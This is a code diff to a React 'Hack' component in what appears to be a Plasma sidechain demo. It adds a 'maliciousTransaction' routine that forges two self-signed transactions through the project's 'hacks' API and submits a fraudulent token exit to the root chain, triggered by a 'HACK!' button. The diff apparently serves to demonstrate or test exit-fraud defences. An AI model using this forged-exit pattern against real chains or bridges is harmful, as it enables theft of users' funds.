@@ -1,7 +1,7 @@
 import React from 'react';
 
 import { exitToken } from '../services/ethService';
-import {sign} from "../utils/cryptoUtils";
+import {generateTransactionHash, sign} from "../utils/cryptoUtils";
 
 class Hack extends React.Component {
 	constructor(props) {
@@ -41,14 +41,100 @@ class Hack extends React.Component {
 		}
 	};
 
+	maliciousTransaction = token => async () => {
+
+	  const hacker = web3.eth.defaultAccount;
+	  const ltResponse = await fetch(`${process.env.API_URL}/api/tokens/${token}/last-transaction`);
+    const lastTransaction = await ltResponse.json();
+
+    console.log("generating first fake transaction");
+
+    const hash1 = generateTransactionHash(token, lastTransaction.minedBlock, hacker);
+    const sign1 = await sign(hash1);
+
+    const body1 = {
+              "slot": token,
+              "owner": hacker,
+              "recipient": hacker,
+              "hash": hash1,
+              "blockSpent": lastTransaction.minedBlock,
+              "signature": sign1
+            };
+
+    const data1Res = await fetch(`${process.env.API_URL}/api/hacks/transactions/create`, {
+              method: 'POST',
+              body: JSON.stringify(body1),
+              headers: {
+                'Content-Type': 'application/json'
+              }
+            });
+
+    const data1 = await data1Res.json();
+    console.log(data1);
+
+    const hash2 = generateTransactionHash(token, data1.block.blockNumber, hacker);
+    const sign2 = await sign(hash2);
+
+    const body2 = {
+      "slot": token,
+      "owner": hacker,
+      "recipient": hacker,
+      "hash": hash2,
+      "blockSpent": data1.block.blockNumber,
+      "signature": sign2
+    };
+
+    const data2Res = await fetch(`${process.env.API_URL}/api/hacks/transactions/create`, {
+      method: 'POST',
+      body: JSON.stringify(body2),
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    });
+    const data2 = await data2Res.json();
+
+    const exitData = {
+      slot: web3.toBigNumber(token),
+      prevTxBytes: data1.exitData.bytes,
+      prevTxInclusionProof: data1.exitData.proof,
+      exitingTxBytes: data2.exitData.bytes,
+      exitingTxInclusionProof: data2.exitData.proof,
+      signature: data2.exitData.signature,
+      prevTransactionHash: data1.exitData.hash,
+      lastTransactionHash: data2.exitData.hash,
+      blocks: [
+        web3.toBigNumber(data1.block.blockNumber),
+        web3.toBigNumber(data2.block.blockNumber)
+      ]
+
+    };
+
+    console.log(exitData);
+
+    exitToken(this.props.rootChain, exitData).then(response => {
+      console.log("Exit successful: ", response);
+    }).catch(console.error);
+
+
+  }
+
 	render = () => {
 		return(
 			<div>
-				<input
-					style={{ marginLeft: '1em', minWidth: '25em' }}
-					onChange={this.onSlotChanged}
-					value={this.state.hackSlot || ''}
-					placeholder="Slot To Hack" />
+        <h2>HACKS!</h2>
+        <input
+          style={{ marginLeft: '1em', minWidth: '25em' }}
+          onChange={this.onSlotChanged}
+          value={this.state.hackSlot || ''}
+          placeholder="Slot To Hack" />
+
+        <h4>Fraudulent Transactions</h4>
+        <button onClick={this.maliciousTransaction("11631887953117068215")}>HACK!</button>
+
+
+
+        <h4>History Hack</h4>
+
 
 				<p>History:</p>
 				{this.state.history.map(event => (
